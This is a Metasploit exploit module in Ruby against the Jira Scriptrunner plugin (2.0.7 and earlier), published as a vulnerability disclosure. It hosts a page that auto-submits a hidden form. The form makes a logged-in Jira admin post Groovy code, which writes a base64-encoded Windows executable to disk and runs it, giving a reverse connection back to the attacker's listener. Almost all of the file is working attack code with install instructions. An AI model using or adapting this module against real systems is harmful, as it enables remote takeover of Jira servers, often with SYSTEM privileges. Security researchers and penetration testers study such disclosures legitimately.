#[Author] Ben 'highjack' Sheppard
#[Title] Jira Scriptrunner 2.0.7 <= CSRF/RCE
#[Twitter] @highjack_
#[Author Url] http://bensheppard.net/jira-scriptrunner-2-0-7/
#[Vendor Url] https://marketplace.atlassian.com/plugins/com.onresolve.jira.groovy.groovyrunner
#[Install] To use this copy it into  ~/.msf4/modules/exploits/windows/http/scriptrunner.rb

require 'msf/core'

class Metasploit4 < Msf::Exploit::Remote
	include Msf::Exploit::Remote::HttpServer::HTML 
	include Msf::Exploit::EXE

	def initialize
	super(
		'Name' => 'Jira Scriptrunner 2.0.7 <= CSRF/RCE',
		'Description' => %q{This jira plugin does notuse the built in jira protections (websudo or csrf tokens)
				 to protect the page from CSRF. This page is supposed to be used by admins to automate tasks,
				it will accept java code and by default in a windows environment jira will
				be run as system},
		'Author' => [ 'Ben \'highjack\' Sheppard'],
		'License' => MSF_LICENSE,
		'Version' => 'Revision: 1 ',
		'Platform' => [ 'win'],
		'Targets' =>
			[
				['Windows',   { 'Arch' => ARCH_X86, 'Platform' => 'win'   }]
			],
		'DefaultTarget' => 0
		)
		
	register_options(
                        [
				OptString.new('RHOST', [true, 'Remote host of jira box']),
                                OptPort.new('RPORT', [true, 'Remote port of jira box', 8080]),
				OptString.new('LHOST', [true, 'Multihandler host to listen on']),
				OptBool.new('IS_SSL', [true, 'Does the target use ssl?', false]),
				OptPort.new('LPORT', [true, 'Multihandler port to listen on',4444])
                        ], self.class)

	end

	def csrf(url)
		shell = Rex::Text.rand_text_alpha(rand(8)+3) + ".exe"
		opts                = {:arch => target.arch, :platform => target.platform}
		encodedPayload      = Rex::Text.encode_base64(generate_payload_exe(opts))
		
		payloadLength = encodedPayload.length
                chunkLength = 500
	
                stringBuffer = ""
                for i in (0..payloadLength / chunkLength)
                        if payloadLength < i+chunkLength
                                 position = payloadLength-i
                        else
                                position = chunkLength
                        end
                        stringBuffer = stringBuffer + "encodedPayload.append(\"" + encodedPayload[i*chunkLength,position] + "\");\n"
                end

		jiraPayload = %Q|
				import sun.misc.BASE64Decoder;
				import java.io.*;
	                        Runtime rt = Runtime.getRuntime();
				try
				{
				
				StringBuffer encodedPayload = new StringBuffer();
				#{stringBuffer}
				String sEncodedPayload = new String(encodedPayload.toString());
				BASE64Decoder b64decoder = new BASE64Decoder();
				byte[] decodedPayload = b64decoder.decodeBuffer(sEncodedPayload);
				
				BufferedOutputStream output = new BufferedOutputStream(new FileOutputStream("#{shell}"));
				output.write(decodedPayload);
				output.close();	
				}
				catch (Exception e)
				{
				return(e);
				}
				try
				{
		|
		jiraPayload = jiraPayload + "rt.exec(\"#{shell}\");}catch (Exception e){return (e);}"
		html = %Q|
		<html>
		<head></head>
		<body>
		<form action='#{url}/secure/admin/groovy/GroovyRunner.jspa' method='POST' id='groovy'>
		<input type='hidden' name='scriptLanguage' value='Groovy' />
		<div style='display:none'>
		<textarea name='script'>#{jiraPayload}&lt;/textarea&gt;
		</div>
		<input type='hidden' name='Run&32;now' value='Run&32;now' />
		</form>
		<script>document.getElementById('groovy').submit();</script>
		</body>
		</html>
		|
		return html
	end
	
	def getUrl()
		rhost = datastore['RHOST']
		rport = datastore['RPORT']
		isSsl = datastore['IS_SSL']

		if isSsl == true
			url = 'https://'
		else
			url = 'http://'
		end
		url = url + rhost + ':' + rport
		return url
	end	
	def on_request_uri(cli, request)
		url = getUrl()
		print_status("\n#{self.name} handling response\n")
		send_response_html( cli, csrf(url), { 'Content-Type' => 'text/html' } )
		return
	end		
	
end
